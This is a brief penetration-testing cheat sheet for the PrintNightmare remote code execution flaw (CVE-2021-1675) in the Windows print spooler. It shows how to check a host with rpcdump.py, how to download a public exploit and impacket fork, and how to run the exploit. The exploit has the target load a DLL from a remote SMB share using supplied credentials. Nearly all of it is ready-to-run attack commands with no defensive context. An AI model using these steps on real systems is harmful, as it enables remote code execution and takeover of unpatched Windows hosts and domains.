# PrintNightmare - RCE


## Check if vulnerable to PrintNightmare

    rpcclient


Check printer nightmare

    rpcdump.py @IP_ADDRESS |grep MS-RPRN


## Exploit

    mkdir -p CVE-2021-1675/{impacket,CVE-2021-1675}

Download files

    git clone https://github.com/cube0x0/impacket CVE-2021-1675/impacket
    git clone https://github.com/cube0x0/CVE-2021-1675 CVE-2021-1675/CVE-2021-1675
    wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/d6ecf9976e78fc9c37caa9ad1c3360447c785a96/CVE-2021-1675.py -O CVE-2021-1675/CVE-2021-1675/PrintNightmare.py


cd CVE-2021-1675

    python -m venv venv
    source venv/bin/activate 

### Impacket Setup
    cd CVE-2021-1675/impacket/
    pip install -r requirements.txt
    python setup.py install

### Exploit

    cd CVE-2021-1675/CVE-2021-1675

E.g. :

PATH_DLL: `\\192.168.1.100\share\system.dll`

Note: Use smbd as the remote file


Run exploit:

```bash
python PrintNightmare.py 'USERNAME:PASSWORD@IP_TARGET' PRINTER_NAME 'PATH_DLL'
```


